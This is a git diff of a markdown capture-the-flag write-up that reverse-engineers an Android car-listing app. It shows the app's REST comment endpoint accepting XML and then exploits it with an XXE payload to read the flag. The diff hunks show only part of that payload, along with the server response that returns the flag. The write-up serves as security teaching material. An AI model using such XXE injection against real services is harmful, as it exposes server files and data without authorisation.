@@ -52,15 +52,19 @@ $ java -jar sign.jar cars_patched.apk
 # Running the Application
 
 This is what we get when we first run the app:
+
 ![main view](img/main_app.png)
 
 When we tap on a car, we get:
+
 ![single car](img/single_car.png)
 
 When we tap on `Send Comment`, we get:
+
 ![comment form](img/comment.png)
 
 Let's fill it out and submit it:
+
 ![filled out form](img/comment_filled.png)
 
 ![comment response](img/submitted_comment.png)
@@ -72,6 +76,7 @@ We see that the `Name` field is sent back to us in the response toast notificati
 With that, let's actually analyze the application in JADX.
 
 Immediately the interface `com.arconsultoria.cars.rest.Rest` catches my eye:
+
 ```java
 package com.arconsultoria.cars.rest;
 
@@ -101,6 +106,7 @@ public interface Rest {
 ```
 
 We see that the `retrofit2` library is used to perform HTTP requests to a backend API. Let's see how it gets used, in `com.arconsultoria.cars.activity.CommentActivity`:
+
 ```java
 package com.arconsultoria.cars.activity;
 
@@ -156,6 +162,7 @@ Looking back at `com.arconsultoria.cars.rest.Rest` interface, we see that there 
     * Some sort of JSON payload comes with this
 
 To figure out the structure of the `/comment` endpoint, I looked at the referenced `com.arconsultoria.cars.domain.Comment` class:
+
 ```java
 package com.arconsultoria.cars.domain;
 
@@ -192,6 +199,7 @@ public final class Comment {
 ```
 
 We can guess that the JSON payload will look like:
+
 ```json
 {
     "name": "Test Comment",
@@ -225,6 +233,7 @@ def make_comment(name, message):
 ```
 
 The `/cars` and `/car/:id` requests weren't very interesting, but let's look at the headers for the `/comment` endpoint:
+
 ```
 Date: Sun, 22 Mar 2020 21:05:09 GMT
 Content-Type: application/json
@@ -242,6 +251,7 @@ alt-svc: h3-27=":443"; ma=86400, h3-25=":443"; ma=86400, h3-24=":443"; ma=86400,
 ```
 
 We also get a JSON response from the API, again seeing that our `Name` field is present in the response:
+
 ```
 {'message': 'Thank you asdf for your comment!'}
 ```
@@ -251,6 +261,7 @@ Hmm, I wonder if we can use other `Content-Type`s? After a quick Google search, 
 # POSTing a comment with XML
 
 First, let's try and send a normal comment with an XML payload. After some Googling, we see that `retrofit2` uses a parent XML element as the class name, and then each parameter as a sub-element, so we construct an XMl payload like this:
+
 ```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <Comment>
@@ -260,6 +271,7 @@ First, let's try and send a normal comment with an XML payload. After some Googl
 ```
 
 Sending that payload (along with setting `Content-Type` to `application/xml`), we get the following JSON response:
+
 ```
 {'message': 'Thank you XML comment! for your comment!'}
 ```
@@ -269,6 +281,7 @@ Yay! This confirms that the application successfully parses our XML payload.
 # XXE Exploit
 
 Now, we need to write an XML payload to get the flag. Let's use a basic XXE payload to load the flag and read it as the `name` element, since it is sent back to us in the response:
+
 ```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
@@ -282,6 +295,7 @@ Now, we need to write an XML payload to get the flag. Let's use a basic XXE payl
 ```
 
 If we send this payload, we get the flag!
+
 ```
 {'message': 'Thank you F#{0h_f1n4lly_y0u_f0und_m3!}\n for your comment!'}
 ```
